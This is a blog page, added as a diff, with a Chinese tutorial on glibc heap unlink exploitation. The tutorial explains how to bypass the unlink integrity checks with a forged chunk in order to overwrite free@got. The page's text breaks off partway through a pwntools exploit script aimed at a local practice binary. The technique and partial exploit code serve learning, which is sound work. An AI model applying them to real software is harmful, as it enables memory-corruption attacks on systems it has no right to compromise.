@@ -1,0 +1,1947 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+    <!-- shw2018 洪卫  modify 2019.08.15-->
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="unlink利用介绍, BUPT PWN Web安全 Java安全">
+    <meta name="baidu-site-verification" content="fmlEuI34ir">
+    <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
+    <meta name="description" content="
+使用电脑浏览效果更佳！
+
+摘要​    记录当下加入检查机制的unlink宏一般利用思想，主要在glibc pwn下的unlink利用手法。
+分析unlink的工作unlink(AV, P, BK, FD)：P是在空闲双向链表中的free">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>unlink利用介绍 | thonsun&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/materialize/1.0.0/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/aos/3.0.0-beta.6/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/lightgallery/1.6.12/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <style type="text/css">
+        
+            
+            code[class*="language-"],
+            pre[class*="language-"] {
+                white-space: pre !important;
+            }
+
+        
+    </style>
+
+    <script src="https://libs.baidu.com/jquery/2.1.4/jquery.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    
+    
+        <script>
+            (function(){
+                var bp = document.createElement('script');
+                var curProtocol = window.location.protocol.split(':')[0];
+                if (curProtocol === 'https') {
+                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+                }
+                else {
+                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                }
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(bp, s);
+            })();
+        </script>
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+    <body>
+
+        <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">thonsun's blog</span>
+                </a>
+            </div>
+            
+
+
+<!-- <a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/AV" class="waves-effect waves-light">
+            
+            <i class="fa fa-music"></i>
+            
+            <span>视听</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/galleries" class="waves-effect waves-light">
+            
+            <i class="fa fa-photo"></i>
+            
+            <span>相册</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于我</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <i class="fa fa-envelope"></i>
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul> -->
+
+<!-- 支持二级菜单特性 洪卫 shw2018 modify 2019.09.17  -->
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right nav-menu">
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/" class="waves-effect waves-light">
+              
+                <i class="fa fa-home"></i>
+              
+              <span>首页</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/tags" class="waves-effect waves-light">
+              
+                <i class="fa fa-tags"></i>
+              
+              <span>标签</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/categories" class="waves-effect waves-light">
+              
+                <i class="fa fa-bookmark"></i>
+              
+              <span>分类</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/archives" class="waves-effect waves-light">
+              
+                <i class="fa fa-archive"></i>
+              
+              <span>归档</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/AV" class="waves-effect waves-light">
+              
+                <i class="fa fa-music"></i>
+              
+              <span>视听</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/galleries" class="waves-effect waves-light">
+              
+                <i class="fa fa-photo"></i>
+              
+              <span>相册</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/about" class="waves-effect waves-light">
+              
+                <i class="fa fa-user-circle-o"></i>
+              
+              <span>关于我</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/contact" class="waves-effect waves-light">
+              
+                <i class="fa fa-envelope"></i>
+              
+              <span>留言板</span>
+            </a>
+
+            
+      </li>
+    
+      <li class="hide-on-med-and-down nav-item" >
+
+        
+            <a href="/friends" class="waves-effect waves-light">
+              
+                <i class="fa fa-address-book"></i>
+              
+              <span>友情链接</span>
+            </a>
+
+            
+      </li>
+    
+
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">thonsun's blog</div>
+        <div class="logo-desc">
+            
+            网络安全 | 代码审计 | Java
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/AV" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-music"></i>
+                
+                视听
+            </a>
+        </li>
+        
+        <li>
+            <a href="/galleries" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-photo"></i>
+                
+                相册
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于我
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-envelope"></i>
+                
+                留言板
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+
+   
+   
+<!-- 支持二级菜单特性 洪卫 shw2018 modify 2019.09.17  -->
+<!-- <ul class="menu-list mobile-menu-list">
+    
+        <li class="m-nav-item">
+                
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-home"></i>
+                        
+                        首页
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/tags" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-tags"></i>
+                        
+                        标签
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/categories" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-bookmark"></i>
+                        
+                        分类
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/archives" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-archive"></i>
+                        
+                        归档
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/AV" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-music"></i>
+                        
+                        视听
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/galleries" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-photo"></i>
+                        
+                        相册
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/about" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-user-circle-o"></i>
+                        
+                        关于我
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/contact" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-envelope"></i>
+                        
+                        留言板
+                    </a>
+              
+            </li>
+        
+        <li class="m-nav-item">
+                
+                    <a href="/friends" class="waves-effect waves-light">
+                        
+                        <i class="fa fa-fw fa-address-book"></i>
+                        
+                        友情链接
+                    </a>
+              
+            </li>
+        
+
+        
+    </ul> -->
+
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+        
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        unlink利用介绍
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- shw2018 洪卫  modify 2019.08.15-->
+<!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/heap/" target="_blank">
+                                <span class="chip bg-color">heap</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/pwn/" class="post-category" target="_blank">
+                                pwn
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-07-25
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                        thonsun
+                    
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        1.7k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        8 分
+                    </div>
+                    
+                
+                
+                
+                        <span id="busuanzi_container_site_pv" style='display:none'></span>
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv" ></span>
+    
+                
+
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>使用电脑浏览效果更佳！</p>
+</blockquote>
+<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​    记录当下加入检查机制的unlink宏一般利用思想，主要在glibc pwn下的unlink利用手法。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="unlink的工作"><a href="#unlink的工作" class="headerlink" title="unlink的工作"></a>unlink的工作</h4><p>unlink(AV, P, BK, FD)：P是在空闲双向链表中的freed chunk(如small bins,larged bins,unsorted bins)</p>
+<ol>
+<li><p>在free检查前后是否可以合并的时候，对free(ptr) ptr前后相邻的chunk就是unlink的目标p（即把它从freed chunk链表卸下的一步工作）;</p>
+</li>
+<li><p>在malloc检查到size符合small bin等(只有fast bin用fd的单向链表，LIFO的分配管理)，分配chunk 从freed chunk 双向链表拿下</p>
+ <a id="more"></a>
+
+</li>
+</ol>
+<h4 id="没有检查机制的unlink"><a href="#没有检查机制的unlink" class="headerlink" title="没有检查机制的unlink"></a>没有检查机制的unlink</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> unlink(AV, P, BK, FD) {                                            </span>
+    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>                                      
+    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>    
+    FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>
+    BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>由于没有检查的机制，对于任意伪造的fake freed chunk（构造user data中的fd,bk指针即可达到对任意地址pointer写机器字长（4bytes | 8 bytes）的数据，常见覆写free@got,free_hook函数等）</p>
+<p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下</p>
+<ul>
+<li>FD=P-&gt;fd = target addr -12</li>
+<li>BK=P-&gt;bk = expect value</li>
+<li>FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li>
+<li>BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12（FD,BK的角色可以调换）</li>
+</ul>
+<p>看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。但在expect value +8 的地址处已经被改变，这需要我们绕过。重要的是，当前的unlink已经加入了检查的机制</p>
+<h4 id="带有检查机制的unlink"><a href="#带有检查机制的unlink" class="headerlink" title="带有检查机制的unlink"></a>带有检查机制的unlink</h4><p>前面介绍的unlink思想还在，但需要我绕过当前加入的检查代码</p>
+<pre class="line-numbers language-C"><code class="language-C">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)
+if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+      malloc_printerr ("corrupted size vs. prev_size");               \
+// 检查 fd 和 bk 指针(双向链表完整性检查)
+if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
+  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
+
+  // largebin 中 next_size 双向链表完整性检查 
+              if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
+                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
+              malloc_printerr (check_action,                                      \
+                               "corrupted double-linked list (not small)",    \
+                               P, AV);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol>
+<li><p>对于 <code>__builtin_expect (chunksize(P) != prev_size (next_chunk(P)</code> 的检查绕过：</p>
+<p> 对一个free掉的chunk（p = malloc(0x80),p返回的是指向chunk的user data开始的指针，chunk包含chunk header域，即p = mem,free(p)== free(mem),内有mem与chunk的指针转换）有两处记录chunk的大小，一是自己chunk header的size，二是逻辑虚拟内存相连的chunk的pre_size域（不管该下一chunk是否in_use）。绕过该检查容易，因为能够通过溢出伪造fake chunk,也能把该fake chunk下一块的pre_size改掉。</p>
+</li>
+<li><p>对于<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code>的检查绕过：</p>
+<p> 要注意到的是，此处的FD-&gt;bk、BK-&gt;fd和P都是chunk ptr，（这也是前面提出的chunk与mem的区别），我们只需要找到一处内存（<code>ptr</code>）内容（<code>*ptr</code>）为P(P是我们可控的malloc返回的mem pointer),即可绕过该检查</p>
+<pre class="line-numbers language-c"><code class="language-c"> <span class="token comment" spellcheck="true">//tr指向的内存保存内容 = p = malloc(),即记录了分配的内存mem指针。</span>
+ <span class="token comment" spellcheck="true">//对于32位平台</span>
+ FD <span class="token operator">=</span> p<span class="token operator">-></span>fd <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr<span class="token number">-0xc</span>
+ BK <span class="token operator">=</span> p<span class="token operator">-></span>bk <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr<span class="token number">-0x8</span>
+ FD<span class="token operator">-></span>bk <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ptr<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> p
+ BK<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ptr <span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token comment" spellcheck="true">//结构体的指针操作，->为一个取ptr内存保存值的操作</span>
+ <span class="token comment" spellcheck="true">//即可绕过检查</span>
+ <span class="token comment" spellcheck="true">//此处改写的内存为</span>
+ FD<span class="token operator">-></span>bk <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ptr<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">=</span> BK <span class="token operator">=</span> ptr<span class="token number">-0x8</span>
+ BK<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ptr <span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">=</span> FD <span class="token operator">=</span> ptr <span class="token operator">-</span><span class="token number">0xc</span>
+ <span class="token comment" spellcheck="true">//即把原本保存malloc返回值的数组变量改为了对ptr-0xc的内容，即我们获得了改全局数组的改写权（因为后面的程序其他chunk的使用也是通过该全局数组内malloc返回的mem指针进行引用）,相当于我们获得了自定义malloc分配的内存地址，因为我们有改写的指针引用，进而可以对任意地址内存写，如覆写free@got,__free_hook等</span>
+ <span class="token comment" spellcheck="true">//后面可以通过对chunk1改为对free@got的引用，对chunk1的写就是对free@got的写</span>
+ <span class="token function">set_chunk</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0xc</span> <span class="token operator">+</span> <span class="token function">p32</span><span class="token punctuation">(</span>ptr<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>free@got<span class="token punctuation">)</span><span class="token punctuation">)</span>
+ <span class="token comment" spellcheck="true">//            padding + chunk0_mem_ptr+chunk1_mem_ptr+....</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> 上面的原理利用图：</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564061351662.png" alt="1564061351662"></p>
+<p> 对于更多版本的利用payload是否绕过：可以通过pwntools的debug检查程序卡在哪里</p>
+<pre class="line-numbers language-python"><code class="language-python"> context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+ <span class="token comment" spellcheck="true"># 需要debug的地方</span>
+ gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+ <span class="token comment" spellcheck="true"># 脚本ctrl+c可以再开一gdb的调试</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564061517009.png" alt="1564061517009"></p>
+<p> 能够看出size与pre_size没有够造好。</p>
+</li>
+</ol>
+<h3 id="程序演示"><a href="#程序演示" class="headerlink" title="程序演示"></a>程序演示</h3><p>下面这个binary演示了简单的unlink利用，如前面部分介绍的利用思想，这里涉及到DynELF的使用（无libc泄露libc地址）和32位的传参栈布局</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564062135895.png" alt="1564062135895"></p>
+<p>64位涉及到寄存器传参。</p>
+<p>详细参考：<a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a></p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 调试pwntools脚本payload在用sendlineafter | sendafter ,关键处进行gdb.attach，多开gdb窗口进行调试</span>
+<span class="token comment" spellcheck="true"># context.update(os='linux', arch='i386',log_level='debug')</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./heap"</span><span class="token punctuation">)</span>
+chunk_list <span class="token operator">=</span> <span class="token number">0x8049d60</span>
+free_got <span class="token operator">=</span> <span class="token number">0x8049ce8</span>
+
+flag <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">0xc</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_list<span class="token number">-0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+    <span class="token keyword">global</span> flag
+    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        set_chunk<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+        flag <span class="token operator">=</span> <span class="token number">1</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        set_chunk<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+    res <span class="token operator">=</span> <span class="token string">""</span>
+    res <span class="token operator">=</span> print_chunk<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking: %#x ---> %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>addr<span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">add_chunk</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># print p.recvuntil('5.Exit\n')</span>
+    <span class="token comment" spellcheck="true"># p.sendline('1')</span>
+    <span class="token comment" spellcheck="true"># print p.recvuntil('Input the size of chunk you want to add:')</span>
+    <span class="token comment" spellcheck="true"># p.sendline(str(len))</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input the size of chunk you want to add:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">set_chunk</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># p.recvuntil('5.Exit\n')</span>
+    <span class="token comment" spellcheck="true"># p.sendline('2')</span>
+    <span class="token comment" spellcheck="true"># p.recvuntil('Set chunk index:')</span>
